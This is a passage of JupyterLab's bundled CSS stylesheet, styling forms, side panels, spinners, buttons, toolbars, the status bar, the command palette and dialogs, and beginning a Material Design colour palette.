  cursor: not-allowed;
  opacity: 0.5;
}

/* RJSF form validation error */

.jp-FormGroup-content .validationErrors {
  color: var(--jp-error-color0);
}

/* Hide panel level error as duplicated the field level error */
.jp-FormGroup-content .panel.errors {
  display: none;
}

/* RJSF normal content (settings-editor) */

.jp-FormGroup-contentNormal {
  display: flex;
  align-items: center;
  flex-wrap: wrap;
}

.jp-FormGroup-contentNormal .jp-FormGroup-contentItem {
  margin-left: 7px;
  color: var(--jp-ui-font-color0);
}

.jp-FormGroup-contentNormal .jp-FormGroup-description {
  flex-basis: 100%;
  padding: 4px 7px;
}

.jp-FormGroup-contentNormal .jp-FormGroup-default {
  flex-basis: 100%;
  padding: 4px 7px;
}

.jp-FormGroup-contentNormal .jp-FormGroup-fieldLabel {
  font-size: var(--jp-content-font-size1);
  font-weight: normal;
  min-width: 120px;
}

.jp-FormGroup-contentNormal fieldset:not(:first-child) {
  margin-left: 7px;
}

.jp-FormGroup-contentNormal .field-array-of-string .array-item {
  /* Display `jp-ArrayOperations` buttons side-by-side with content except
    for small screens where flex-wrap will place them one below the other.
  */
  display: flex;
  align-items: center;
  flex-wrap: wrap;
}

.jp-FormGroup-contentNormal .jp-objectFieldWrapper .form-group {
  padding: 2px 8px 2px var(--jp-private-settingeditor-modifier-indent);
  margin-top: 2px;
}

/* RJSF compact content (metadata-form) */

.jp-FormGroup-content.jp-FormGroup-contentCompact {
  width: 100%;
}

.jp-FormGroup-contentCompact .form-group {
  display: flex;
  padding: 0.5em 0.2em 0.5em 0;
}

.jp-FormGroup-contentCompact
  .jp-FormGroup-compactTitle
  .jp-FormGroup-description {
  font-size: var(--jp-ui-font-size1);
  color: var(--jp-ui-font-color2);
}

.jp-FormGroup-contentCompact .jp-FormGroup-fieldLabel {
  padding-bottom: 0.3em;
}

.jp-FormGroup-contentCompact .jp-inputFieldWrapper .form-control {
  width: 100%;
  box-sizing: border-box;
}

.jp-FormGroup-contentCompact .jp-arrayFieldWrapper .jp-FormGroup-compactTitle {
  padding-bottom: 7px;
}

.jp-FormGroup-contentCompact
  .jp-objectFieldWrapper
  .jp-objectFieldWrapper
  .form-group {
  padding: 2px 8px 2px var(--jp-private-settingeditor-modifier-indent);
  margin-top: 2px;
}

.jp-FormGroup-contentCompact ul.error-detail {
  margin-block-start: 0.5em;
  margin-block-end: 0.5em;
  padding-inline-start: 1em;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

.jp-SidePanel {
  display: flex;
  flex-direction: column;
  min-width: var(--jp-sidebar-min-width);
  overflow-y: auto;
  color: var(--jp-ui-font-color1);
  background: var(--jp-layout-color1);
  font-size: var(--jp-ui-font-size1);
}

.jp-SidePanel-header {
  flex: 0 0 auto;
  display: flex;
  border-bottom: var(--jp-border-width) solid var(--jp-border-color2);
  font-size: var(--jp-ui-font-size0);
  font-weight: 600;
  letter-spacing: 1px;
  margin: 0;
  padding: 2px;
  text-transform: uppercase;
}

.jp-SidePanel-toolbar {
  flex: 0 0 auto;
}

.jp-SidePanel-content {
  flex: 1 1 auto;
}

.jp-SidePanel-toolbar,
.jp-AccordionPanel-toolbar {
  height: var(--jp-private-toolbar-height);
}

.jp-SidePanel-toolbar.jp-Toolbar-micro {
  display: none;
}

.lm-AccordionPanel .jp-AccordionPanel-title {
  box-sizing: border-box;
  line-height: 25px;
  margin: 0;
  display: flex;
  align-items: center;
  background: var(--jp-layout-color1);
  color: var(--jp-ui-font-color1);
  border-bottom: var(--jp-border-width) solid var(--jp-toolbar-border-color);
  box-shadow: var(--jp-toolbar-box-shadow);
  font-size: var(--jp-ui-font-size0);
}

.jp-AccordionPanel-title {
  cursor: pointer;
  user-select: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  text-transform: uppercase;
}

.lm-AccordionPanel[data-orientation='horizontal'] > .jp-AccordionPanel-title {
  /* Title is rotated for horizontal accordion panel using CSS */
  display: block;
  transform-origin: top left;
  transform: rotate(-90deg) translate(-100%);
}

.jp-AccordionPanel-title .lm-AccordionPanel-titleLabel {
  user-select: none;
  text-overflow: ellipsis;
  white-space: nowrap;
  overflow: hidden;
}

.jp-AccordionPanel-title .lm-AccordionPanel-titleCollapser {
  transform: rotate(-90deg);
  margin: auto 0;
  height: 16px;
}

.jp-AccordionPanel-title.lm-mod-expanded .lm-AccordionPanel-titleCollapser {
  transform: rotate(0deg);
}

.lm-AccordionPanel .jp-AccordionPanel-toolbar {
  background: none;
  box-shadow: none;
  border: none;
  margin-left: auto;
}

.lm-AccordionPanel .lm-SplitPanel-handle:hover {
  background: var(--jp-layout-color3);
}

.jp-text-truncated {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

/*-----------------------------------------------------------------------------
| Copyright (c) 2017, Jupyter Development Team.
|
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.jp-Spinner {
  position: absolute;
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 10;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  background: var(--jp-layout-color0);
  outline: none;
}

.jp-SpinnerContent {
  font-size: 10px;
  margin: 50px auto;
  text-indent: -9999em;
  width: 3em;
  height: 3em;
  border-radius: 50%;
  background: var(--jp-brand-color3);
  background: linear-gradient(
    to right,
    #f37626 10%,
    rgba(255, 255, 255, 0) 42%
  );
  position: relative;
  animation: load3 1s infinite linear, fadeIn 1s;
}

.jp-SpinnerContent::before {
  width: 50%;
  height: 50%;
  background: #f37626;
  border-radius: 100% 0 0;
  position: absolute;
  top: 0;
  left: 0;
  content: '';
}

.jp-SpinnerContent::after {
  background: var(--jp-layout-color0);
  width: 75%;
  height: 75%;
  border-radius: 50%;
  content: '';
  margin: auto;
  position: absolute;
  top: 0;
  left: 0;
  bottom: 0;
  right: 0;
}

@keyframes fadeIn {
  0% {
    opacity: 0;
  }

  100% {
    opacity: 1;
  }
}

@keyframes load3 {
  0% {
    transform: rotate(0deg);
  }

  100% {
    transform: rotate(360deg);
  }
}

/*-----------------------------------------------------------------------------
| Copyright (c) 2014-2017, Jupyter Development Team.
|
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

button.jp-mod-styled {
  font-size: var(--jp-ui-font-size1);
  color: var(--jp-ui-font-color0);
  border: none;
  box-sizing: border-box;
  text-align: center;
  line-height: 32px;
  height: 32px;
  padding: 0 12px;
  letter-spacing: 0.8px;
  outline: none;
  appearance: none;
  -webkit-appearance: none;
  -moz-appearance: none;
}

input.jp-mod-styled {
  background: var(--jp-input-background);
  height: 28px;
  box-sizing: border-box;
  border: var(--jp-border-width) solid var(--jp-border-color1);
  padding-left: 7px;
  padding-right: 7px;
  font-size: var(--jp-ui-font-size2);
  color: var(--jp-ui-font-color0);
  outline: none;
  appearance: none;
  -webkit-appearance: none;
  -moz-appearance: none;
}

input[type='checkbox'].jp-mod-styled {
  appearance: checkbox;
  -webkit-appearance: checkbox;
  -moz-appearance: checkbox;
  height: auto;
}

input.jp-mod-styled:focus {
  border: var(--jp-border-width) solid var(--md-blue-500);
  box-shadow: inset 0 0 4px var(--md-blue-300);
}

.jp-select-wrapper {
  display: flex;
  position: relative;
  flex-direction: column;
  padding: 1px;
  background-color: var(--jp-layout-color1);
  box-sizing: border-box;
  margin-bottom: 12px;
}

.jp-select-wrapper:not(.multiple) {
  height: 28px;
}

.jp-select-wrapper.jp-mod-focused select.jp-mod-styled {
  border: var(--jp-border-width) solid var(--jp-input-active-border-color);
  box-shadow: var(--jp-input-box-shadow);
  background-color: var(--jp-input-active-background);
}

select.jp-mod-styled:hover {
  cursor: pointer;
  color: var(--jp-ui-font-color0);
  background-color: var(--jp-input-hover-background);
  box-shadow: inset 0 0 1px rgba(0, 0, 0, 0.5);
}

select.jp-mod-styled {
  flex: 1 1 auto;
  width: 100%;
  font-size: var(--jp-ui-font-size2);
  background: var(--jp-input-background);
  color: var(--jp-ui-font-color0);
  padding: 0 25px 0 8px;
  border: var(--jp-border-width) solid var(--jp-input-border-color);
  border-radius: 0;
  outline: none;
  appearance: none;
  -webkit-appearance: none;
  -moz-appearance: none;
}

select.jp-mod-styled:not([multiple]) {
  height: 32px;
}

select.jp-mod-styled[multiple] {
  max-height: 200px;
  overflow-y: auto;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.jp-switch {
  display: flex;
  align-items: center;
  padding-left: 4px;
  padding-right: 4px;
  font-size: var(--jp-ui-font-size1);
  background-color: transparent;
  color: var(--jp-ui-font-color1);
  border: none;
  height: 20px;
}

.jp-switch:hover {
  background-color: var(--jp-layout-color2);
}

.jp-switch-label {
  margin-right: 5px;
  font-family: var(--jp-ui-font-family);
}

.jp-switch-track {
  cursor: pointer;
  background-color: var(--jp-switch-color, var(--jp-border-color1));
  -webkit-transition: 0.4s;
  transition: 0.4s;
  border-radius: 34px;
  height: 16px;
  width: 35px;
  position: relative;
}

.jp-switch-track::before {
  content: '';
  position: absolute;
  height: 10px;
  width: 10px;
  margin: 3px;
  left: 0;
  background-color: var(--jp-ui-inverse-font-color1);
  -webkit-transition: 0.4s;
  transition: 0.4s;
  border-radius: 50%;
}

.jp-switch[aria-checked='true'] .jp-switch-track {
  background-color: var(--jp-switch-true-position-color, var(--jp-warn-color0));
}

.jp-switch[aria-checked='true'] .jp-switch-track::before {
  /* track width (35) - margins (3 + 3) - thumb width (10) */
  left: 19px;
}

/*-----------------------------------------------------------------------------
| Copyright (c) 2014-2016, Jupyter Development Team.
|
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

:root {
  --jp-private-toolbar-height: calc(
    28px + var(--jp-border-width)
  ); /* leave 28px for content */
}

.jp-Toolbar {
  color: var(--jp-ui-font-color1);
  flex: 0 0 auto;
  display: flex;
  flex-direction: row;
  border-bottom: var(--jp-border-width) solid var(--jp-toolbar-border-color);
  box-shadow: var(--jp-toolbar-box-shadow);
  background: var(--jp-toolbar-background);
  min-height: var(--jp-toolbar-micro-height);
  padding: 2px;
  z-index: 8;
  overflow-x: hidden;
}

/* Toolbar items */

.jp-Toolbar > .jp-Toolbar-item.jp-Toolbar-spacer {
  flex-grow: 1;
  flex-shrink: 1;
}

.jp-Toolbar-item.jp-Toolbar-kernelStatus {
  display: inline-block;
  width: 32px;
  background-repeat: no-repeat;
  background-position: center;
  background-size: 16px;
}

.jp-Toolbar > .jp-Toolbar-item {
  flex: 0 0 auto;
  display: flex;
  padding-left: 1px;
  padding-right: 1px;
  font-size: var(--jp-ui-font-size1);
  line-height: var(--jp-private-toolbar-height);
  height: 100%;
}

/* Toolbar buttons */

/* This is the div we use to wrap the react component into a Widget */
div.jp-ToolbarButton {
  color: transparent;
  border: none;
  box-sizing: border-box;
  outline: none;
  appearance: none;
  -webkit-appearance: none;
  -moz-appearance: none;
  padding: 0;
  margin: 0;
}

button.jp-ToolbarButtonComponent {
  background: var(--jp-layout-color1);
  border: none;
  box-sizing: border-box;
  outline: none;
  appearance: none;
  -webkit-appearance: none;
  -moz-appearance: none;
  padding: 0 6px;
  margin: 0;
  height: 24px;
  border-radius: var(--jp-border-radius);
  display: flex;
  align-items: center;
  text-align: center;
  font-size: 14px;
  min-width: unset;
  min-height: unset;
}

button.jp-ToolbarButtonComponent:disabled {
  opacity: 0.4;
}

button.jp-ToolbarButtonComponent > span {
  padding: 0;
  flex: 0 0 auto;
}

button.jp-ToolbarButtonComponent .jp-ToolbarButtonComponent-label {
  font-size: var(--jp-ui-font-size1);
  line-height: 100%;
  padding-left: 2px;
  color: var(--jp-ui-font-color1);
  font-family: var(--jp-ui-font-family);
}

#jp-main-dock-panel[data-mode='single-document']
  .jp-MainAreaWidget
  > .jp-Toolbar.jp-Toolbar-micro {
  padding: 0;
  min-height: 0;
}

#jp-main-dock-panel[data-mode='single-document']
  .jp-MainAreaWidget
  > .jp-Toolbar {
  border: none;
  box-shadow: none;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

.jp-WindowedPanel-outer {
  position: relative;
  overflow-y: auto;
}

.jp-WindowedPanel-inner {
  position: relative;
}

.jp-WindowedPanel-window {
  position: absolute;
  left: 0;
  right: 0;
  overflow: visible;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/* Sibling imports */

body {
  color: var(--jp-ui-font-color1);
  font-size: var(--jp-ui-font-size1);
}

/* Disable native link decoration styles everywhere outside of dialog boxes */
a {
  text-decoration: unset;
  color: unset;
}

a:hover {
  text-decoration: unset;
  color: unset;
}

/* Accessibility for links inside dialog box text */
.jp-Dialog-content a {
  text-decoration: revert;
  color: var(--jp-content-link-color);
}

.jp-Dialog-content a:hover {
  text-decoration: revert;
}

/* Styles for ui-components */
.jp-Button {
  color: var(--jp-ui-font-color2);
  border-radius: var(--jp-border-radius);
  padding: 0 12px;
  font-size: var(--jp-ui-font-size1);

  /* Copy from blueprint 3 */
  display: inline-flex;
  flex-direction: row;
  border: none;
  cursor: pointer;
  align-items: center;
  justify-content: center;
  text-align: left;
  vertical-align: middle;
  min-height: 30px;
  min-width: 30px;
}

.jp-Button:disabled {
  cursor: not-allowed;
}

.jp-Button:empty {
  padding: 0 !important;
}

.jp-Button.jp-mod-small {
  min-height: 24px;
  min-width: 24px;
  font-size: 12px;
  padding: 0 7px;
}

/* Use our own theme for hover styles */
.jp-Button.jp-mod-minimal:hover {
  background-color: var(--jp-layout-color2);
}

.jp-Button.jp-mod-minimal {
  background: none;
}

.jp-InputGroup {
  display: block;
  position: relative;
}

.jp-InputGroup input {
  box-sizing: border-box;
  border: none;
  border-radius: 0;
  background-color: transparent;
  color: var(--jp-ui-font-color0);
  box-shadow: inset 0 0 0 var(--jp-border-width) var(--jp-input-border-color);
  padding-bottom: 0;
  padding-top: 0;
  padding-left: 10px;
  padding-right: 28px;
  position: relative;
  width: 100%;
  -webkit-appearance: none;
  -moz-appearance: none;
  appearance: none;
  font-size: 14px;
  font-weight: 400;
  height: 30px;
  line-height: 30px;
  outline: none;
  vertical-align: middle;
}

.jp-InputGroup input:focus {
  box-shadow: inset 0 0 0 var(--jp-border-width)
      var(--jp-input-active-box-shadow-color),
    inset 0 0 0 3px var(--jp-input-active-box-shadow-color);
}

.jp-InputGroup input:disabled {
  cursor: not-allowed;
  resize: block;
  background-color: var(--jp-layout-color2);
  color: var(--jp-ui-font-color2);
}

.jp-InputGroup input:disabled ~ span {
  cursor: not-allowed;
  color: var(--jp-ui-font-color2);
}

.jp-InputGroup input::placeholder,
input::placeholder {
  color: var(--jp-ui-font-color2);
}

.jp-InputGroupAction {
  position: absolute;
  bottom: 1px;
  right: 0;
  padding: 6px;
}

.jp-HTMLSelect.jp-DefaultStyle select {
  background-color: initial;
  border: none;
  border-radius: 0;
  box-shadow: none;
  color: var(--jp-ui-font-color0);
  display: block;
  font-size: var(--jp-ui-font-size1);
  font-family: var(--jp-ui-font-family);
  height: 24px;
  line-height: 14px;
  padding: 0 25px 0 10px;
  text-align: left;
  -moz-appearance: none;
  -webkit-appearance: none;
}

.jp-HTMLSelect.jp-DefaultStyle select:disabled {
  background-color: var(--jp-layout-color2);
  color: var(--jp-ui-font-color2);
  cursor: not-allowed;
  resize: block;
}

.jp-HTMLSelect.jp-DefaultStyle select:disabled ~ span {
  cursor: not-allowed;
}

/* Use our own theme for hover and option styles */
/* stylelint-disable-next-line selector-max-type */
.jp-HTMLSelect.jp-DefaultStyle select:hover,
.jp-HTMLSelect.jp-DefaultStyle select > option {
  background-color: var(--jp-layout-color2);
  color: var(--jp-ui-font-color0);
}

select {
  box-sizing: border-box;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Styles
|----------------------------------------------------------------------------*/

.jp-StatusBar-Widget {
  display: flex;
  align-items: center;
  background: var(--jp-layout-color2);
  min-height: var(--jp-statusbar-height);
  justify-content: space-between;
  padding: 0 10px;
}

.jp-StatusBar-Left {
  display: flex;
  align-items: center;
  flex-direction: row;
}

.jp-StatusBar-Middle {
  display: flex;
  align-items: center;
}

.jp-StatusBar-Right {
  display: flex;
  align-items: center;
  flex-direction: row-reverse;
}

.jp-StatusBar-Item {
  max-height: var(--jp-statusbar-height);
  margin: 0 2px;
  height: var(--jp-statusbar-height);
  white-space: nowrap;
  text-overflow: ellipsis;
  color: var(--jp-ui-font-color1);
  padding: 0 6px;
}

.jp-mod-highlighted:hover {
  background-color: var(--jp-layout-color3);
}

.jp-mod-clicked {
  background-color: var(--jp-brand-color1);
}

.jp-mod-clicked:hover {
  background-color: var(--jp-brand-color0);
}

.jp-mod-clicked .jp-StatusBar-TextItem {
  color: var(--jp-ui-inverse-font-color1);
}

.jp-StatusBar-HoverItem {
  box-shadow: '0px 4px 4px rgba(0, 0, 0, 0.25)';
}

.jp-StatusBar-TextItem {
  font-size: var(--jp-ui-font-size1);
  font-family: var(--jp-ui-font-family);
  line-height: 24px;
  color: var(--jp-ui-font-color1);
}

.jp-StatusBar-GroupItem {
  display: flex;
  align-items: center;
  flex-direction: row;
}

.jp-Statusbar-ProgressCircle svg {
  display: block;
  margin: 0 auto;
  width: 16px;
  height: 24px;
  align-self: normal;
}

.jp-Statusbar-ProgressCircle path {
  fill: var(--jp-inverse-layout-color3);
}

.jp-Statusbar-ProgressBar-progress-bar {
  height: 10px;
  width: 100px;
  border: solid 0.25px var(--jp-brand-color2);
  border-radius: 3px;
  overflow: hidden;
  align-self: center;
}

.jp-Statusbar-ProgressBar-progress-bar > div {
  background-color: var(--jp-brand-color2);
  background-image: linear-gradient(
    -45deg,
    rgba(255, 255, 255, 0.2) 25%,
    transparent 25%,
    transparent 50%,
    rgba(255, 255, 255, 0.2) 50%,
    rgba(255, 255, 255, 0.2) 75%,
    transparent 75%,
    transparent
  );
  background-size: 40px 40px;
  float: left;
  width: 0%;
  height: 100%;
  font-size: 12px;
  line-height: 14px;
  color: #fff;
  text-align: center;
  animation: jp-Statusbar-ExecutionTime-progress-bar 2s linear infinite;
}

.jp-Statusbar-ProgressBar-progress-bar p {
  color: var(--jp-ui-font-color1);
  font-family: var(--jp-ui-font-family);
  font-size: var(--jp-ui-font-size1);
  line-height: 10px;
  width: 100px;
}

@keyframes jp-Statusbar-ExecutionTime-progress-bar {
  0% {
    background-position: 0 0;
  }

  100% {
    background-position: 40px 40px;
  }
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Variables
|----------------------------------------------------------------------------*/

:root {
  --jp-private-commandpalette-search-height: 28px;
}

/*-----------------------------------------------------------------------------
| Overall styles
|----------------------------------------------------------------------------*/

.lm-CommandPalette {
  padding-bottom: 0;
  color: var(--jp-ui-font-color1);
  background: var(--jp-layout-color1);

  /* This is needed so that all font sizing of children done in ems is
   * relative to this base size */
  font-size: var(--jp-ui-font-size1);
}

/*-----------------------------------------------------------------------------
| Modal variant
|----------------------------------------------------------------------------*/

.jp-ModalCommandPalette {
  position: absolute;
  z-index: 10000;
  top: 38px;
  left: 30%;
  margin: 0;
  padding: 4px;
  width: 40%;
  box-shadow: var(--jp-elevation-z4);
  border-radius: 4px;
  background: var(--jp-layout-color0);
}

.jp-ModalCommandPalette .lm-CommandPalette {
  max-height: 40vh;
}

.jp-ModalCommandPalette .lm-CommandPalette .lm-close-icon::after {
  display: none;
}

.jp-ModalCommandPalette .lm-CommandPalette .lm-CommandPalette-header {
  display: none;
}

.jp-ModalCommandPalette .lm-CommandPalette .lm-CommandPalette-item {
  margin-left: 4px;
  margin-right: 4px;
}

.jp-ModalCommandPalette
  .lm-CommandPalette
  .lm-CommandPalette-item.lm-mod-disabled {
  display: none;
}

/*-----------------------------------------------------------------------------
| Search
|----------------------------------------------------------------------------*/

.lm-CommandPalette-search {
  padding: 4px;
  background-color: var(--jp-layout-color1);
  z-index: 2;
}

.lm-CommandPalette-wrapper {
  overflow: overlay;
  padding: 0 9px;
  background-color: var(--jp-input-active-background);
  height: 30px;
  box-shadow: inset 0 0 0 var(--jp-border-width) var(--jp-input-border-color);
}

.lm-CommandPalette.lm-mod-focused .lm-CommandPalette-wrapper {
  box-shadow: inset 0 0 0 1px var(--jp-input-active-box-shadow-color),
    inset 0 0 0 3px var(--jp-input-active-box-shadow-color);
}

.jp-SearchIconGroup {
  color: white;
  background-color: var(--jp-brand-color1);
  position: absolute;
  top: 4px;
  right: 4px;
  padding: 5px 5px 1px;
}

.jp-SearchIconGroup svg {
  height: 20px;
  width: 20px;
}

.jp-SearchIconGroup .jp-icon3[fill] {
  fill: var(--jp-layout-color0);
}

.lm-CommandPalette-input {
  background: transparent;
  width: calc(100% - 18px);
  float: left;
  border: none;
  outline: none;
  font-size: var(--jp-ui-font-size1);
  color: var(--jp-ui-font-color0);
  line-height: var(--jp-private-commandpalette-search-height);
}

.lm-CommandPalette-input::-webkit-input-placeholder,
.lm-CommandPalette-input::-moz-placeholder,
.lm-CommandPalette-input:-ms-input-placeholder {
  color: var(--jp-ui-font-color2);
  font-size: var(--jp-ui-font-size1);
}

/*-----------------------------------------------------------------------------
| Results
|----------------------------------------------------------------------------*/

.lm-CommandPalette-header:first-child {
  margin-top: 0;
}

.lm-CommandPalette-header {
  border-bottom: solid var(--jp-border-width) var(--jp-border-color2);
  color: var(--jp-ui-font-color1);
  cursor: pointer;
  display: flex;
  font-size: var(--jp-ui-font-size0);
  font-weight: 600;
  letter-spacing: 1px;
  margin-top: 8px;
  padding: 8px 0 8px 12px;
  text-transform: uppercase;
}

.lm-CommandPalette-header.lm-mod-active {
  background: var(--jp-layout-color2);
}

.lm-CommandPalette-header > mark {
  background-color: transparent;
  font-weight: bold;
  color: var(--jp-ui-font-color1);
}

.lm-CommandPalette-item {
  padding: 4px 12px 4px 4px;
  color: var(--jp-ui-font-color1);
  font-size: var(--jp-ui-font-size1);
  font-weight: 400;
  display: flex;
}

.lm-CommandPalette-item.lm-mod-disabled {
  color: var(--jp-ui-font-color2);
}

.lm-CommandPalette-item.lm-mod-active {
  color: var(--jp-ui-inverse-font-color1);
  background: var(--jp-brand-color1);
}

.lm-CommandPalette-item.lm-mod-active .lm-CommandPalette-itemLabel > mark {
  color: var(--jp-ui-inverse-font-color0);
}

.lm-CommandPalette-item.lm-mod-active .jp-icon-selectable[fill] {
  fill: var(--jp-layout-color0);
}

.lm-CommandPalette-item.lm-mod-active:hover:not(.lm-mod-disabled) {
  color: var(--jp-ui-inverse-font-color1);
  background: var(--jp-brand-color1);
}

.lm-CommandPalette-item:hover:not(.lm-mod-active):not(.lm-mod-disabled) {
  background: var(--jp-layout-color2);
}

.lm-CommandPalette-itemContent {
  overflow: hidden;
}

.lm-CommandPalette-itemLabel > mark {
  color: var(--jp-ui-font-color0);
  background-color: transparent;
  font-weight: bold;
}

.lm-CommandPalette-item.lm-mod-disabled mark {
  color: var(--jp-ui-font-color2);
}

.lm-CommandPalette-item .lm-CommandPalette-itemIcon {
  margin: 0 4px 0 0;
  position: relative;
  width: 16px;
  top: 2px;
  flex: 0 0 auto;
}

.lm-CommandPalette-item.lm-mod-disabled .lm-CommandPalette-itemIcon {
  opacity: 0.6;
}

.lm-CommandPalette-item .lm-CommandPalette-itemShortcut {
  flex: 0 0 auto;
}

.lm-CommandPalette-itemCaption {
  display: none;
}

.lm-CommandPalette-content {
  background-color: var(--jp-layout-color1);
}

.lm-CommandPalette-content:empty::after {
  content: 'No results';
  margin: auto;
  margin-top: 20px;
  width: 100px;
  display: block;
  font-size: var(--jp-ui-font-size2);
  font-family: var(--jp-ui-font-family);
  font-weight: lighter;
}

.lm-CommandPalette-emptyMessage {
  text-align: center;
  margin-top: 24px;
  line-height: 1.32;
  padding: 0 8px;
  color: var(--jp-content-font-color3);
}

/*-----------------------------------------------------------------------------
| Copyright (c) 2014-2017, Jupyter Development Team.
|
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.jp-Dialog {
  position: absolute;
  z-index: 10000;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  top: 0;
  left: 0;
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
  background: var(--jp-dialog-background);
}

.jp-Dialog-content {
  display: flex;
  flex-direction: column;
  margin-left: auto;
  margin-right: auto;
  background: var(--jp-layout-color1);
  padding: 24px 24px 12px;
  min-width: 300px;
  min-height: 150px;
  max-width: 1000px;
  max-height: 500px;
  box-sizing: border-box;
  box-shadow: var(--jp-elevation-z20);
  word-wrap: break-word;
  border-radius: var(--jp-border-radius);

  /* This is needed so that all font sizing of children done in ems is
   * relative to this base size */
  font-size: var(--jp-ui-font-size1);
  color: var(--jp-ui-font-color1);
  resize: both;
}

.jp-Dialog-content.jp-Dialog-content-small {
  max-width: 500px;
}

.jp-Dialog-button {
  overflow: visible;
}

button.jp-Dialog-button:focus {
  outline: 1px solid var(--jp-brand-color1);
  outline-offset: 4px;
  -moz-outline-radius: 0;
}

button.jp-Dialog-button:focus::-moz-focus-inner {
  border: 0;
}

button.jp-Dialog-button.jp-mod-styled.jp-mod-accept:focus,
button.jp-Dialog-button.jp-mod-styled.jp-mod-warn:focus,
button.jp-Dialog-button.jp-mod-styled.jp-mod-reject:focus {
  outline-offset: 4px;
  -moz-outline-radius: 0;
}

button.jp-Dialog-button.jp-mod-styled.jp-mod-accept:focus {
  outline: 1px solid var(--jp-accept-color-normal, var(--jp-brand-color1));
}

button.jp-Dialog-button.jp-mod-styled.jp-mod-warn:focus {
  outline: 1px solid var(--jp-warn-color-normal, var(--jp-error-color1));
}

button.jp-Dialog-button.jp-mod-styled.jp-mod-reject:focus {
  outline: 1px solid var(--jp-reject-color-normal, var(--md-grey-600));
}

button.jp-Dialog-close-button {
  padding: 0;
  height: 100%;
  min-width: unset;
  min-height: unset;
}

.jp-Dialog-header {
  display: flex;
  justify-content: space-between;
  flex: 0 0 auto;
  padding-bottom: 12px;
  font-size: var(--jp-ui-font-size3);
  font-weight: 400;
  color: var(--jp-ui-font-color1);
}

.jp-Dialog-body {
  display: flex;
  flex-direction: column;
  flex: 1 1 auto;
  font-size: var(--jp-ui-font-size1);
  background: var(--jp-layout-color1);
  color: var(--jp-ui-font-color1);
  overflow: auto;
}

.jp-Dialog-footer {
  display: flex;
  flex-direction: row;
  justify-content: flex-end;
  align-items: center;
  flex: 0 0 auto;
  margin-left: -12px;
  margin-right: -12px;
  padding: 12px;
}

.jp-Dialog-checkbox {
  padding-right: 5px;
}

.jp-Dialog-checkbox > input:focus-visible {
  outline: 1px solid var(--jp-input-active-border-color);
  outline-offset: 1px;
}

.jp-Dialog-spacer {
  flex: 1 1 auto;
}

.jp-Dialog-title {
  overflow: hidden;
  white-space: nowrap;
  text-overflow: ellipsis;
}

.jp-Dialog-body > .jp-select-wrapper {
  width: 100%;
}

.jp-Dialog-body > button {
  padding: 0 16px;
}

.jp-Dialog-body > label {
  line-height: 1.4;
  color: var(--jp-ui-font-color0);
}

.jp-Dialog-button.jp-mod-styled:not(:last-child) {
  margin-right: 12px;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

.jp-Input-Boolean-Dialog {
  flex-direction: row-reverse;
  align-items: end;
  width: 100%;
}

.jp-Input-Boolean-Dialog > label {
  flex: 1 1 auto;
}

/*-----------------------------------------------------------------------------
| Copyright (c) 2014-2016, Jupyter Development Team.
|
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.jp-MainAreaWidget > :focus {
  outline: none;
}

.jp-MainAreaWidget .jp-MainAreaWidget-error {
  padding: 6px;
}

.jp-MainAreaWidget .jp-MainAreaWidget-error > pre {
  width: auto;
  padding: 10px;
  background: var(--jp-error-color3);
  border: var(--jp-border-width) solid var(--jp-error-color1);
  border-radius: var(--jp-border-radius);
  color: var(--jp-ui-font-color1);
  font-size: var(--jp-ui-font-size1);
  white-space: pre-wrap;
  word-wrap: break-word;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

/**
 * google-material-color v1.2.6
 * https://github.com/danlevan/google-material-color
 */
:root {
  --md-red-50: #ffebee;
  --md-red-100: #ffcdd2;
  --md-red-200: #ef9a9a;
  --md-red-300: #e57373;
  --md-red-400: #ef5350;
  --md-red-500: #f44336;
  --md-red-600: #e53935;
  --md-red-700: #d32f2f;
  --md-red-800: #c62828;
  --md-red-900: #b71c1c;
  --md-red-A100: #ff8a80;
  --md-red-A200: #ff5252;
  --md-red-A400: #ff1744;
  --md-red-A700: #d50000;
  --md-pink-50: #fce4ec;
  --md-pink-100: #f8bbd0;
  --md-pink-200: #f48fb1;
  --md-pink-300: #f06292;
  --md-pink-400: #ec407a;
  --md-pink-500: #e91e63;
  --md-pink-600: #d81b60;
  --md-pink-700: #c2185b;
  --md-pink-800: #ad1457;
  --md-pink-900: #880e4f;
  --md-pink-A100: #ff80ab;
  --md-pink-A200: #ff4081;
  --md-pink-A400: #f50057;
  --md-pink-A700: #c51162;
  --md-purple-50: #f3e5f5;
  --md-purple-100: #e1bee7;
  --md-purple-200: #ce93d8;
  --md-purple-300: #ba68c8;
  --md-purple-400: #ab47bc;
  --md-purple-500: #9c27b0;
  --md-purple-600: #8e24aa;
  --md-purple-700: #7b1fa2;
  --md-purple-800: #6a1b9a;
  --md-purple-900: #4a148c;
  --md-purple-A100: #ea80fc;
  --md-purple-A200: #e040fb;
  --md-purple-A400: #d500f9;
  --md-purple-A700: #a0f;
